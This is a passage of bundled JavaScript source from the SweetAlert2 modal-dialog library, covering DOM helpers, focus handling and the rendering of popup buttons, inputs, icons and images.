* Released under the MIT License.
*/
function _assertClassBrand(e2, t, n2) {
  if ("function" == typeof e2 ? e2 === t : e2.has(t)) return arguments.length < 3 ? t : n2;
  throw new TypeError("Private element is not present on this object");
}
function _checkPrivateRedeclaration(e2, t) {
  if (t.has(e2)) throw new TypeError("Cannot initialize the same private elements twice on an object");
}
function _classPrivateFieldGet2(s2, a) {
  return s2.get(_assertClassBrand(s2, a));
}
function _classPrivateFieldInitSpec(e2, t, a) {
  _checkPrivateRedeclaration(e2, t), t.set(e2, a);
}
function _classPrivateFieldSet2(s2, a, r) {
  return s2.set(_assertClassBrand(s2, a), r), r;
}
const RESTORE_FOCUS_TIMEOUT = 100;
const globalState = {};
const focusPreviousActiveElement = () => {
  if (globalState.previousActiveElement instanceof HTMLElement) {
    globalState.previousActiveElement.focus();
    globalState.previousActiveElement = null;
  } else if (document.body) {
    document.body.focus();
  }
};
const restoreActiveElement = (returnFocus) => {
  return new Promise((resolve) => {
    if (!returnFocus) {
      return resolve();
    }
    const x = window.scrollX;
    const y3 = window.scrollY;
    globalState.restoreFocusTimeout = setTimeout(() => {
      focusPreviousActiveElement();
      resolve();
    }, RESTORE_FOCUS_TIMEOUT);
    window.scrollTo(x, y3);
  });
};
const swalPrefix = "swal2-";
const classNames = ["container", "shown", "height-auto", "iosfix", "popup", "modal", "no-backdrop", "no-transition", "toast", "toast-shown", "show", "hide", "close", "title", "html-container", "actions", "confirm", "deny", "cancel", "default-outline", "footer", "icon", "icon-content", "image", "input", "file", "range", "select", "radio", "checkbox", "label", "textarea", "inputerror", "input-label", "validation-message", "progress-steps", "active-progress-step", "progress-step", "progress-step-line", "loader", "loading", "styled", "top", "top-start", "top-end", "top-left", "top-right", "center", "center-start", "center-end", "center-left", "center-right", "bottom", "bottom-start", "bottom-end", "bottom-left", "bottom-right", "grow-row", "grow-column", "grow-fullscreen", "rtl", "timer-progress-bar", "timer-progress-bar-container", "scrollbar-measure", "icon-success", "icon-warning", "icon-info", "icon-question", "icon-error"];
const swalClasses = classNames.reduce(
  (acc, className) => {
    acc[className] = swalPrefix + className;
    return acc;
  },
  /** @type {SwalClasses} */
  {}
);
const icons = ["success", "warning", "info", "question", "error"];
const iconTypes = icons.reduce(
  (acc, icon) => {
    acc[icon] = swalPrefix + icon;
    return acc;
  },
  /** @type {SwalIcons} */
  {}
);
const consolePrefix = "SweetAlert2:";
const capitalizeFirstLetter = (str) => str.charAt(0).toUpperCase() + str.slice(1);
const warn = (message) => {
  console.warn(`${consolePrefix} ${typeof message === "object" ? message.join(" ") : message}`);
};
const error = (message) => {
  console.error(`${consolePrefix} ${message}`);
};
const previousWarnOnceMessages = [];
const warnOnce = (message) => {
  if (!previousWarnOnceMessages.includes(message)) {
    previousWarnOnceMessages.push(message);
    warn(message);
  }
};
const warnAboutDeprecation = function(deprecatedParam) {
  let useInstead = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : null;
  warnOnce(`"${deprecatedParam}" is deprecated and will be removed in the next major release.${useInstead ? ` Use "${useInstead}" instead.` : ""}`);
};
const callIfFunction = (arg) => typeof arg === "function" ? arg() : arg;
const hasToPromiseFn = (arg) => arg && typeof arg.toPromise === "function";
const asPromise = (arg) => hasToPromiseFn(arg) ? arg.toPromise() : Promise.resolve(arg);
const isPromise = (arg) => arg && Promise.resolve(arg) === arg;
const getContainer = () => document.body.querySelector(`.${swalClasses.container}`);
const elementBySelector = (selectorString) => {
  const container = getContainer();
  return container ? container.querySelector(selectorString) : null;
};
const elementByClass = (className) => {
  return elementBySelector(`.${className}`);
};
const getPopup = () => elementByClass(swalClasses.popup);
const getIcon = () => elementByClass(swalClasses.icon);
const getIconContent = () => elementByClass(swalClasses["icon-content"]);
const getTitle = () => elementByClass(swalClasses.title);
const getHtmlContainer = () => elementByClass(swalClasses["html-container"]);
const getImage = () => elementByClass(swalClasses.image);
const getProgressSteps = () => elementByClass(swalClasses["progress-steps"]);
const getValidationMessage = () => elementByClass(swalClasses["validation-message"]);
const getConfirmButton = () => (
  /** @type {HTMLButtonElement} */
  elementBySelector(`.${swalClasses.actions} .${swalClasses.confirm}`)
);
const getCancelButton = () => (
  /** @type {HTMLButtonElement} */
  elementBySelector(`.${swalClasses.actions} .${swalClasses.cancel}`)
);
const getDenyButton = () => (
  /** @type {HTMLButtonElement} */
  elementBySelector(`.${swalClasses.actions} .${swalClasses.deny}`)
);
const getInputLabel = () => elementByClass(swalClasses["input-label"]);
const getLoader = () => elementBySelector(`.${swalClasses.loader}`);
const getActions = () => elementByClass(swalClasses.actions);
const getFooter = () => elementByClass(swalClasses.footer);
const getTimerProgressBar = () => elementByClass(swalClasses["timer-progress-bar"]);
const getCloseButton = () => elementByClass(swalClasses.close);
const focusable = `
  a[href],
  area[href],
  input:not([disabled]),
  select:not([disabled]),
  textarea:not([disabled]),
  button:not([disabled]),
  iframe,
  object,
  embed,
  [tabindex="0"],
  [contenteditable],
  audio[controls],
  video[controls],
  summary
`;
const getFocusableElements = () => {
  const popup = getPopup();
  if (!popup) {
    return [];
  }
  const focusableElementsWithTabindex = popup.querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])');
  const focusableElementsWithTabindexSorted = Array.from(focusableElementsWithTabindex).sort((a, b) => {
    const tabindexA = parseInt(a.getAttribute("tabindex") || "0");
    const tabindexB = parseInt(b.getAttribute("tabindex") || "0");
    if (tabindexA > tabindexB) {
      return 1;
    } else if (tabindexA < tabindexB) {
      return -1;
    }
    return 0;
  });
  const otherFocusableElements = popup.querySelectorAll(focusable);
  const otherFocusableElementsFiltered = Array.from(otherFocusableElements).filter((el) => el.getAttribute("tabindex") !== "-1");
  return [...new Set(focusableElementsWithTabindexSorted.concat(otherFocusableElementsFiltered))].filter((el) => isVisible$1(el));
};
const isModal = () => {
  return hasClass(document.body, swalClasses.shown) && !hasClass(document.body, swalClasses["toast-shown"]) && !hasClass(document.body, swalClasses["no-backdrop"]);
};
const isToast = () => {
  const popup = getPopup();
  if (!popup) {
    return false;
  }
  return hasClass(popup, swalClasses.toast);
};
const isLoading = () => {
  const popup = getPopup();
  if (!popup) {
    return false;
  }
  return popup.hasAttribute("data-loading");
};
const setInnerHtml = (elem, html2) => {
  elem.textContent = "";
  if (html2) {
    const parser = new DOMParser();
    const parsed = parser.parseFromString(html2, `text/html`);
    const head = parsed.querySelector("head");
    if (head) {
      Array.from(head.childNodes).forEach((child) => {
        elem.appendChild(child);
      });
    }
    const body = parsed.querySelector("body");
    if (body) {
      Array.from(body.childNodes).forEach((child) => {
        if (child instanceof HTMLVideoElement || child instanceof HTMLAudioElement) {
          elem.appendChild(child.cloneNode(true));
        } else {
          elem.appendChild(child);
        }
      });
    }
  }
};
const hasClass = (elem, className) => {
  if (!className) {
    return false;
  }
  const classList = className.split(/\s+/);
  for (let i2 = 0; i2 < classList.length; i2++) {
    if (!elem.classList.contains(classList[i2])) {
      return false;
    }
  }
  return true;
};
const removeCustomClasses = (elem, params) => {
  Array.from(elem.classList).forEach((className) => {
    if (!Object.values(swalClasses).includes(className) && !Object.values(iconTypes).includes(className) && !Object.values(params.showClass || {}).includes(className)) {
      elem.classList.remove(className);
    }
  });
};
const applyCustomClass = (elem, params, className) => {
  removeCustomClasses(elem, params);
  if (!params.customClass) {
    return;
  }
  const customClass = params.customClass[
    /** @type {keyof SweetAlertCustomClass} */
    className
  ];
  if (!customClass) {
    return;
  }
  if (typeof customClass !== "string" && !customClass.forEach) {
    warn(`Invalid type of customClass.${className}! Expected string or iterable object, got "${typeof customClass}"`);
    return;
  }
  addClass(elem, customClass);
};
const getInput$1 = (popup, inputClass) => {
  if (!inputClass) {
    return null;
  }
  switch (inputClass) {
    case "select":
    case "textarea":
    case "file":
      return popup.querySelector(`.${swalClasses.popup} > .${swalClasses[inputClass]}`);
    case "checkbox":
      return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.checkbox} input`);
    case "radio":
      return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:checked`) || popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:first-child`);
    case "range":
      return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.range} input`);
    default:
      return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.input}`);
  }
};
const focusInput = (input2) => {
  input2.focus();
  if (input2.type !== "file") {
    const val = input2.value;
    input2.value = "";
    input2.value = val;
  }
};
const toggleClass = (target, classList, condition) => {
  if (!target || !classList) {
    return;
  }
  if (typeof classList === "string") {
    classList = classList.split(/\s+/).filter(Boolean);
  }
  classList.forEach((className) => {
    if (Array.isArray(target)) {
      target.forEach((elem) => {
        if (condition) {
          elem.classList.add(className);
        } else {
          elem.classList.remove(className);
        }
      });
    } else {
      if (condition) {
        target.classList.add(className);
      } else {
        target.classList.remove(className);
      }
    }
  });
};
const addClass = (target, classList) => {
  toggleClass(target, classList, true);
};
const removeClass = (target, classList) => {
  toggleClass(target, classList, false);
};
const getDirectChildByClass = (elem, className) => {
  const children = Array.from(elem.children);
  for (let i2 = 0; i2 < children.length; i2++) {
    const child = children[i2];
    if (child instanceof HTMLElement && hasClass(child, className)) {
      return child;
    }
  }
};
const applyNumericalStyle = (elem, property, value) => {
  if (value === `${parseInt(value)}`) {
    value = parseInt(value);
  }
  if (value || parseInt(value) === 0) {
    elem.style.setProperty(property, typeof value === "number" ? `${value}px` : value);
  } else {
    elem.style.removeProperty(property);
  }
};
const show = function(elem) {
  let display = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "flex";
  if (!elem) {
    return;
  }
  elem.style.display = display;
};
const hide = (elem) => {
  if (!elem) {
    return;
  }
  elem.style.display = "none";
};
const showWhenInnerHtmlPresent = function(elem) {
  let display = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "block";
  if (!elem) {
    return;
  }
  new MutationObserver(() => {
    toggle$1(elem, elem.innerHTML, display);
  }).observe(elem, {
    childList: true,
    subtree: true
  });
};
const setStyle = (parent, selector, property, value) => {
  const el = parent.querySelector(selector);
  if (el) {
    el.style.setProperty(property, value);
  }
};
const toggle$1 = function(elem, condition) {
  let display = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : "flex";
  if (condition) {
    show(elem, display);
  } else {
    hide(elem);
  }
};
const isVisible$1 = (elem) => !!(elem && (elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length));
const allButtonsAreHidden = () => !isVisible$1(getConfirmButton()) && !isVisible$1(getDenyButton()) && !isVisible$1(getCancelButton());
const isScrollable = (elem) => !!(elem.scrollHeight > elem.clientHeight);
const hasCssAnimation = (elem) => {
  const style = window.getComputedStyle(elem);
  const animDuration = parseFloat(style.getPropertyValue("animation-duration") || "0");
  const transDuration = parseFloat(style.getPropertyValue("transition-duration") || "0");
  return animDuration > 0 || transDuration > 0;
};
const animateTimerProgressBar = function(timer) {
  let reset = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : false;
  const timerProgressBar = getTimerProgressBar();
  if (!timerProgressBar) {
    return;
  }
  if (isVisible$1(timerProgressBar)) {
    if (reset) {
      timerProgressBar.style.transition = "none";
      timerProgressBar.style.width = "100%";
    }
    setTimeout(() => {
      timerProgressBar.style.transition = `width ${timer / 1e3}s linear`;
      timerProgressBar.style.width = "0%";
    }, 10);
  }
};
const stopTimerProgressBar = () => {
  const timerProgressBar = getTimerProgressBar();
  if (!timerProgressBar) {
    return;
  }
  const timerProgressBarWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
  timerProgressBar.style.removeProperty("transition");
  timerProgressBar.style.width = "100%";
  const timerProgressBarFullWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
  const timerProgressBarPercent = timerProgressBarWidth / timerProgressBarFullWidth * 100;
  timerProgressBar.style.width = `${timerProgressBarPercent}%`;
};
const isNodeEnv = () => typeof window === "undefined" || typeof document === "undefined";
const sweetHTML = `
 <div aria-labelledby="${swalClasses.title}" aria-describedby="${swalClasses["html-container"]}" class="${swalClasses.popup}" tabindex="-1">
   <button type="button" class="${swalClasses.close}"></button>
   <ul class="${swalClasses["progress-steps"]}"></ul>
   <div class="${swalClasses.icon}"></div>
   <img class="${swalClasses.image}" />
   <h2 class="${swalClasses.title}" id="${swalClasses.title}"></h2>
   <div class="${swalClasses["html-container"]}" id="${swalClasses["html-container"]}"></div>
   <input class="${swalClasses.input}" id="${swalClasses.input}" />
   <input type="file" class="${swalClasses.file}" />
   <div class="${swalClasses.range}">
     <input type="range" />
     <output></output>
   </div>
   <select class="${swalClasses.select}" id="${swalClasses.select}"></select>
   <div class="${swalClasses.radio}"></div>
   <label class="${swalClasses.checkbox}">
     <input type="checkbox" id="${swalClasses.checkbox}" />
     <span class="${swalClasses.label}"></span>
   </label>
   <textarea class="${swalClasses.textarea}" id="${swalClasses.textarea}"></textarea>
   <div class="${swalClasses["validation-message"]}" id="${swalClasses["validation-message"]}"></div>
   <div class="${swalClasses.actions}">
     <div class="${swalClasses.loader}"></div>
     <button type="button" class="${swalClasses.confirm}"></button>
     <button type="button" class="${swalClasses.deny}"></button>
     <button type="button" class="${swalClasses.cancel}"></button>
   </div>
   <div class="${swalClasses.footer}"></div>
   <div class="${swalClasses["timer-progress-bar-container"]}">
     <div class="${swalClasses["timer-progress-bar"]}"></div>
   </div>
 </div>
`.replace(/(^|\n)\s*/g, "");
const resetOldContainer = () => {
  const oldContainer = getContainer();
  if (!oldContainer) {
    return false;
  }
  oldContainer.remove();
  removeClass([document.documentElement, document.body], [swalClasses["no-backdrop"], swalClasses["toast-shown"], swalClasses["has-column"]]);
  return true;
};
const resetValidationMessage$1 = () => {
  globalState.currentInstance.resetValidationMessage();
};
const addInputChangeListeners = () => {
  const popup = getPopup();
  const input2 = getDirectChildByClass(popup, swalClasses.input);
  const file = getDirectChildByClass(popup, swalClasses.file);
  const range2 = popup.querySelector(`.${swalClasses.range} input`);
  const rangeOutput = popup.querySelector(`.${swalClasses.range} output`);
  const select = getDirectChildByClass(popup, swalClasses.select);
  const checkbox = popup.querySelector(`.${swalClasses.checkbox} input`);
  const textarea2 = getDirectChildByClass(popup, swalClasses.textarea);
  input2.oninput = resetValidationMessage$1;
  file.onchange = resetValidationMessage$1;
  select.onchange = resetValidationMessage$1;
  checkbox.onchange = resetValidationMessage$1;
  textarea2.oninput = resetValidationMessage$1;
  range2.oninput = () => {
    resetValidationMessage$1();
    rangeOutput.value = range2.value;
  };
  range2.onchange = () => {
    resetValidationMessage$1();
    rangeOutput.value = range2.value;
  };
};
const getTarget = (target) => typeof target === "string" ? document.querySelector(target) : target;
const setupAccessibility = (params) => {
  const popup = getPopup();
  popup.setAttribute("role", params.toast ? "alert" : "dialog");
  popup.setAttribute("aria-live", params.toast ? "polite" : "assertive");
  if (!params.toast) {
    popup.setAttribute("aria-modal", "true");
  }
};
const setupRTL = (targetElement) => {
  if (window.getComputedStyle(targetElement).direction === "rtl") {
    addClass(getContainer(), swalClasses.rtl);
  }
};
const init = (params) => {
  const oldContainerExisted = resetOldContainer();
  if (isNodeEnv()) {
    error("SweetAlert2 requires document to initialize");
    return;
  }
  const container = document.createElement("div");
  container.className = swalClasses.container;
  if (oldContainerExisted) {
    addClass(container, swalClasses["no-transition"]);
  }
  setInnerHtml(container, sweetHTML);
  const targetElement = getTarget(params.target);
  targetElement.appendChild(container);
  setupAccessibility(params);
  setupRTL(targetElement);
  addInputChangeListeners();
};
const parseHtmlToContainer = (param, target) => {
  if (param instanceof HTMLElement) {
    target.appendChild(param);
  } else if (typeof param === "object") {
    handleObject(param, target);
  } else if (param) {
    setInnerHtml(target, param);
  }
};
const handleObject = (param, target) => {
  if (param.jquery) {
    handleJqueryElem(target, param);
  } else {
    setInnerHtml(target, param.toString());
  }
};
const handleJqueryElem = (target, elem) => {
  target.textContent = "";
  if (0 in elem) {
    for (let i2 = 0; i2 in elem; i2++) {
      target.appendChild(elem[i2].cloneNode(true));
    }
  } else {
    target.appendChild(elem.cloneNode(true));
  }
};
const renderActions = (instance, params) => {
  const actions2 = getActions();
  const loader = getLoader();
  if (!actions2 || !loader) {
    return;
  }
  if (!params.showConfirmButton && !params.showDenyButton && !params.showCancelButton) {
    hide(actions2);
  } else {
    show(actions2);
  }
  applyCustomClass(actions2, params, "actions");
  renderButtons(actions2, loader, params);
  setInnerHtml(loader, params.loaderHtml || "");
  applyCustomClass(loader, params, "loader");
};
function renderButtons(actions2, loader, params) {
  const confirmButton = getConfirmButton();
  const denyButton = getDenyButton();
  const cancelButton = getCancelButton();
  if (!confirmButton || !denyButton || !cancelButton) {
    return;
  }
  renderButton(confirmButton, "confirm", params);
  renderButton(denyButton, "deny", params);
  renderButton(cancelButton, "cancel", params);
  handleButtonsStyling(confirmButton, denyButton, cancelButton, params);
  if (params.reverseButtons) {
    if (params.toast) {
      actions2.insertBefore(cancelButton, confirmButton);
      actions2.insertBefore(denyButton, confirmButton);
    } else {
      actions2.insertBefore(cancelButton, loader);
      actions2.insertBefore(denyButton, loader);
      actions2.insertBefore(confirmButton, loader);
    }
  }
}
function handleButtonsStyling(confirmButton, denyButton, cancelButton, params) {
  if (!params.buttonsStyling) {
    removeClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
    return;
  }
  addClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
  if (params.confirmButtonColor) {
    confirmButton.style.backgroundColor = params.confirmButtonColor;
    addClass(confirmButton, swalClasses["default-outline"]);
  }
  if (params.denyButtonColor) {
    denyButton.style.backgroundColor = params.denyButtonColor;
    addClass(denyButton, swalClasses["default-outline"]);
  }
  if (params.cancelButtonColor) {
    cancelButton.style.backgroundColor = params.cancelButtonColor;
    addClass(cancelButton, swalClasses["default-outline"]);
  }
}
function renderButton(button, buttonType, params) {
  const buttonName = (
    /** @type {'Confirm' | 'Deny' | 'Cancel'} */
    capitalizeFirstLetter(buttonType)
  );
  toggle$1(button, params[`show${buttonName}Button`], "inline-block");
  setInnerHtml(button, params[`${buttonType}ButtonText`] || "");
  button.setAttribute("aria-label", params[`${buttonType}ButtonAriaLabel`] || "");
  button.className = swalClasses[buttonType];
  applyCustomClass(button, params, `${buttonType}Button`);
}
const renderCloseButton = (instance, params) => {
  const closeButton = getCloseButton();
  if (!closeButton) {
    return;
  }
  setInnerHtml(closeButton, params.closeButtonHtml || "");
  applyCustomClass(closeButton, params, "closeButton");
  toggle$1(closeButton, params.showCloseButton);
  closeButton.setAttribute("aria-label", params.closeButtonAriaLabel || "");
};
const renderContainer = (instance, params) => {
  const container = getContainer();
  if (!container) {
    return;
  }
  handleBackdropParam(container, params.backdrop);
  handlePositionParam(container, params.position);
  handleGrowParam(container, params.grow);
  applyCustomClass(container, params, "container");
};
function handleBackdropParam(container, backdrop) {
  if (typeof backdrop === "string") {
    container.style.background = backdrop;
  } else if (!backdrop) {
    addClass([document.documentElement, document.body], swalClasses["no-backdrop"]);
  }
}
function handlePositionParam(container, position) {
  if (!position) {
    return;
  }
  if (position in swalClasses) {
    addClass(container, swalClasses[position]);
  } else {
    warn('The "position" parameter is not valid, defaulting to "center"');
    addClass(container, swalClasses.center);
  }
}
function handleGrowParam(container, grow) {
  if (!grow) {
    return;
  }
  addClass(container, swalClasses[`grow-${grow}`]);
}
var privateProps = {
  innerParams: /* @__PURE__ */ new WeakMap(),
  domCache: /* @__PURE__ */ new WeakMap()
};
const inputClasses = ["input", "file", "range", "select", "radio", "checkbox", "textarea"];
const renderInput = (instance, params) => {
  const popup = getPopup();
  if (!popup) {
    return;
  }
  const innerParams = privateProps.innerParams.get(instance);
  const rerender = !innerParams || params.input !== innerParams.input;
  inputClasses.forEach((inputClass) => {
    const inputContainer = getDirectChildByClass(popup, swalClasses[inputClass]);
    if (!inputContainer) {
      return;
    }
    setAttributes(inputClass, params.inputAttributes);
    inputContainer.className = swalClasses[inputClass];
    if (rerender) {
      hide(inputContainer);
    }
  });
  if (params.input) {
    if (rerender) {
      showInput(params);
    }
    setCustomClass(params);
  }
};
const showInput = (params) => {
  if (!params.input) {
    return;
  }
  if (!renderInputType[params.input]) {
    error(`Unexpected type of input! Expected ${Object.keys(renderInputType).join(" | ")}, got "${params.input}"`);
    return;
  }
  const inputContainer = getInputContainer(params.input);
  if (!inputContainer) {
    return;
  }
  const input2 = renderInputType[params.input](inputContainer, params);
  show(inputContainer);
  if (params.inputAutoFocus) {
    setTimeout(() => {
      focusInput(input2);
    });
  }
};
const removeAttributes = (input2) => {
  for (let i2 = 0; i2 < input2.attributes.length; i2++) {
    const attrName = input2.attributes[i2].name;
    if (!["id", "type", "value", "style"].includes(attrName)) {
      input2.removeAttribute(attrName);
    }
  }
};
const setAttributes = (inputClass, inputAttributes) => {
  const popup = getPopup();
  if (!popup) {
    return;
  }
  const input2 = getInput$1(popup, inputClass);
  if (!input2) {
    return;
  }
  removeAttributes(input2);
  for (const attr in inputAttributes) {
    input2.setAttribute(attr, inputAttributes[attr]);
  }
};
const setCustomClass = (params) => {
  if (!params.input) {
    return;
  }
  const inputContainer = getInputContainer(params.input);
  if (inputContainer) {
    applyCustomClass(inputContainer, params, "input");
  }
};
const setInputPlaceholder = (input2, params) => {
  if (!input2.placeholder && params.inputPlaceholder) {
    input2.placeholder = params.inputPlaceholder;
  }
};
const setInputLabel = (input2, prependTo, params) => {
  if (params.inputLabel) {
    const label = document.createElement("label");
    const labelClass = swalClasses["input-label"];
    label.setAttribute("for", input2.id);
    label.className = labelClass;
    if (typeof params.customClass === "object") {
      addClass(label, params.customClass.inputLabel);
    }
    label.innerText = params.inputLabel;
    prependTo.insertAdjacentElement("beforebegin", label);
  }
};
const getInputContainer = (inputType) => {
  const popup = getPopup();
  if (!popup) {
    return;
  }
  return getDirectChildByClass(popup, swalClasses[
    /** @type {SwalClass} */
    inputType
  ] || swalClasses.input);
};
const checkAndSetInputValue = (input2, inputValue) => {
  if (["string", "number"].includes(typeof inputValue)) {
    input2.value = `${inputValue}`;
  } else if (!isPromise(inputValue)) {
    warn(`Unexpected type of inputValue! Expected "string", "number" or "Promise", got "${typeof inputValue}"`);
  }
};
const renderInputType = {};
renderInputType.text = renderInputType.email = renderInputType.password = renderInputType.number = renderInputType.tel = renderInputType.url = renderInputType.search = renderInputType.date = renderInputType["datetime-local"] = renderInputType.time = renderInputType.week = renderInputType.month = /** @type {(input: Input | HTMLElement, params: SweetAlertOptions) => Input} */
(input2, params) => {
  checkAndSetInputValue(input2, params.inputValue);
  setInputLabel(input2, input2, params);
  setInputPlaceholder(input2, params);
  input2.type = params.input;
  return input2;
};
renderInputType.file = (input2, params) => {
  setInputLabel(input2, input2, params);
  setInputPlaceholder(input2, params);
  return input2;
};
renderInputType.range = (range2, params) => {
  const rangeInput = range2.querySelector("input");
  const rangeOutput = range2.querySelector("output");
  checkAndSetInputValue(rangeInput, params.inputValue);
  rangeInput.type = params.input;
  checkAndSetInputValue(rangeOutput, params.inputValue);
  setInputLabel(rangeInput, range2, params);
  return range2;
};
renderInputType.select = (select, params) => {
  select.textContent = "";
  if (params.inputPlaceholder) {
    const placeholder = document.createElement("option");
    setInnerHtml(placeholder, params.inputPlaceholder);
    placeholder.value = "";
    placeholder.disabled = true;
    placeholder.selected = true;
    select.appendChild(placeholder);
  }
  setInputLabel(select, select, params);
  return select;
};
renderInputType.radio = (radio) => {
  radio.textContent = "";
  return radio;
};
renderInputType.checkbox = (checkboxContainer, params) => {
  const checkbox = getInput$1(getPopup(), "checkbox");
  checkbox.value = "1";
  checkbox.checked = Boolean(params.inputValue);
  const label = checkboxContainer.querySelector("span");
  setInnerHtml(label, params.inputPlaceholder || params.inputLabel);
  return checkbox;
};
renderInputType.textarea = (textarea2, params) => {
  checkAndSetInputValue(textarea2, params.inputValue);
  setInputPlaceholder(textarea2, params);
  setInputLabel(textarea2, textarea2, params);
  const getMargin = (el) => parseInt(window.getComputedStyle(el).marginLeft) + parseInt(window.getComputedStyle(el).marginRight);
  setTimeout(() => {
    if ("MutationObserver" in window) {
      const initialPopupWidth = parseInt(window.getComputedStyle(getPopup()).width);
      const textareaResizeHandler = () => {
        if (!document.body.contains(textarea2)) {
          return;
        }
        const textareaWidth = textarea2.offsetWidth + getMargin(textarea2);
        if (textareaWidth > initialPopupWidth) {
          getPopup().style.width = `${textareaWidth}px`;
        } else {
          applyNumericalStyle(getPopup(), "width", params.width);
        }
      };
      new MutationObserver(textareaResizeHandler).observe(textarea2, {
        attributes: true,
        attributeFilter: ["style"]
      });
    }
  });
  return textarea2;
};
const renderContent = (instance, params) => {
  const htmlContainer = getHtmlContainer();
  if (!htmlContainer) {
    return;
  }
  showWhenInnerHtmlPresent(htmlContainer);
  applyCustomClass(htmlContainer, params, "htmlContainer");
  if (params.html) {
    parseHtmlToContainer(params.html, htmlContainer);
    show(htmlContainer, "block");
  } else if (params.text) {
    htmlContainer.textContent = params.text;
    show(htmlContainer, "block");
  } else {
    hide(htmlContainer);
  }
  renderInput(instance, params);
};
const renderFooter = (instance, params) => {
  const footer = getFooter();
  if (!footer) {
    return;
  }
  showWhenInnerHtmlPresent(footer);
  toggle$1(footer, params.footer, "block");
  if (params.footer) {
    parseHtmlToContainer(params.footer, footer);
  }
  applyCustomClass(footer, params, "footer");
};
const renderIcon = (instance, params) => {
  const innerParams = privateProps.innerParams.get(instance);
  const icon = getIcon();
  if (!icon) {
    return;
  }
  if (innerParams && params.icon === innerParams.icon) {
    setContent(icon, params);
    applyStyles(icon, params);
    return;
  }
  if (!params.icon && !params.iconHtml) {
    hide(icon);
    return;
  }
  if (params.icon && Object.keys(iconTypes).indexOf(params.icon) === -1) {
    error(`Unknown icon! Expected "success", "error", "warning", "info" or "question", got "${params.icon}"`);
    hide(icon);
    return;
  }
  show(icon);
  setContent(icon, params);
  applyStyles(icon, params);
  addClass(icon, params.showClass && params.showClass.icon);
};
const applyStyles = (icon, params) => {
  for (const [iconType, iconClassName] of Object.entries(iconTypes)) {
    if (params.icon !== iconType) {
      removeClass(icon, iconClassName);
    }
  }
  addClass(icon, params.icon && iconTypes[params.icon]);
  setColor(icon, params);
  adjustSuccessIconBackgroundColor();
  applyCustomClass(icon, params, "icon");
};
const adjustSuccessIconBackgroundColor = () => {
  const popup = getPopup();
  if (!popup) {
    return;
  }
  const popupBackgroundColor = window.getComputedStyle(popup).getPropertyValue("background-color");
  const successIconParts = popup.querySelectorAll("[class^=swal2-success-circular-line], .swal2-success-fix");
  for (let i2 = 0; i2 < successIconParts.length; i2++) {
    successIconParts[i2].style.backgroundColor = popupBackgroundColor;
  }
};
const successIconHtml = `
  <div class="swal2-success-circular-line-left"></div>
  <span class="swal2-success-line-tip"></span> <span class="swal2-success-line-long"></span>
  <div class="swal2-success-ring"></div> <div class="swal2-success-fix"></div>
  <div class="swal2-success-circular-line-right"></div>
`;
const errorIconHtml = `
  <span class="swal2-x-mark">
    <span class="swal2-x-mark-line-left"></span>
    <span class="swal2-x-mark-line-right"></span>
  </span>
`;
const setContent = (icon, params) => {
  if (!params.icon && !params.iconHtml) {
    return;
  }
  let oldContent = icon.innerHTML;
  let newContent = "";
  if (params.iconHtml) {
    newContent = iconContent(params.iconHtml);
  } else if (params.icon === "success") {
    newContent = successIconHtml;
    oldContent = oldContent.replace(/ style=".*?"/g, "");
  } else if (params.icon === "error") {
    newContent = errorIconHtml;
  } else if (params.icon) {
    const defaultIconHtml = {
      question: "?",
      warning: "!",
      info: "i"
    };
    newContent = iconContent(defaultIconHtml[params.icon]);
  }
  if (oldContent.trim() !== newContent.trim()) {
    setInnerHtml(icon, newContent);
  }
};
const setColor = (icon, params) => {
  if (!params.iconColor) {
    return;
  }
  icon.style.color = params.iconColor;
  icon.style.borderColor = params.iconColor;
  for (const sel of [".swal2-success-line-tip", ".swal2-success-line-long", ".swal2-x-mark-line-left", ".swal2-x-mark-line-right"]) {
    setStyle(icon, sel, "background-color", params.iconColor);
  }
  setStyle(icon, ".swal2-success-ring", "border-color", params.iconColor);
};
const iconContent = (content) => `<div class="${swalClasses["icon-content"]}">${content}</div>`;
const renderImage = (instance, params) => {
  const image2 = getImage();
  if (!image2) {
    return;
  }
  if (!params.imageUrl) {
    hide(image2);
    return;
  }
  show(image2, "");
  image2.setAttribute("src", params.imageUrl);
  image2.setAttribute("alt", params.imageAlt || "");
  applyNumericalStyle(image2, "width", params.imageWidth);
  applyNumericalStyle(image2, "height", params.imageHeight);
  image2.className = swalClasses.image;
  applyCustomClass(image2, params, "image");
};
const renderPopup = (instance, params) => {
  const container = getContainer();
  const popup = getPopup();
  if (!container || !popup) {
    return;
  }
  if (params.toast) {
    applyNumericalStyle(container, "width", params.width);
    popup.style.width = "100%";
    const loader = getLoader();
    if (loader) {
      popup.insertBefore(loader, getIcon());
    }
  } else {
    applyNumericalStyle(popup, "width", params.width);
  }
  applyNumericalStyle(popup, "padding", params.padding);
  if (params.color) {
    popup.style.color = params.color;
  }
  if (params.background) {
    popup.style.background = params.background;
  }
  hide(getValidationMessage());
  addClasses$1(popup, params);
};
const addClasses$1 = (popup, params) => {
  const showClass = params.showClass || {};
  popup.className = `${swalClasses.popup} ${isVisible$1(popup) ? showClass.popup : ""}`;
  if (params.toast) {
    addClass([document.documentElement, document.body], swalClasses["toast-shown"]);
    addClass(popup, swalClasses.toast);
  } else {
    addClass(popup, swalClasses.modal);
  }
  applyCustomClass(popup, params, "popup");
  if (typeof params.customClass === "string") {
    addClass(popup, params.customClass);
  }
  if (params.icon) {
    addClass(popup, swalClasses[`icon-${params.icon}`]);
  }
};
const renderProgressSteps = (instance, params) => {
  const progressStepsContainer = getProgressSteps();
  if (!progressStepsContainer) {
    return;
  }
  const {
    progressSteps,
    currentProgressStep
  } = params;
  if (!progressSteps || progressSteps.length === 0 || currentProgressStep === void 0) {
    hide(progressStepsContainer);
    return;
  }
